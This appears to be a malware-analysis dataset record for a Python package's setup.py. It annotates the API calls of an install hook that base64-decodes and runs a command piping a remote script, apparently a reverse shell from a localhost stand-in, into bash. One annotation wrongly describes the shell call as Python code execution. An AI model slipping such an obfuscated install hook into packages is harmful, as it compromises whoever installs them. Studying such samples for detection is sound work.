[
  {
    "pyfile": "setup.py",
    "code_snippet": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))\n\nfrom setuptools.command.install import install\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()",
    "pattern_analysis": {
      "api_sequence": [
        "base64_code.encode",
        "base64.b64decode",
        "code_bytes.decode",
        "os.system",
        "setuptools.command.install.install.run",
        "notmalfunc"
      ],
      "api_sequence_with_args": [
        "base64_code.encode('ascii')",
        "base64.b64decode(base64_bytes)",
        "code_bytes.decode('ascii')",
        "os.system(b64d(\"Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))",
        "setuptools.command.install.install.run(self)",
        "notmalfunc()"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64_code.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "code_bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "notmalfunc",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))\n\nfrom setuptools.command.install import install\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
    }
  },
  {
    "metadata": {
      "package_name": "mecit1-1.0.0"
    }
  }
]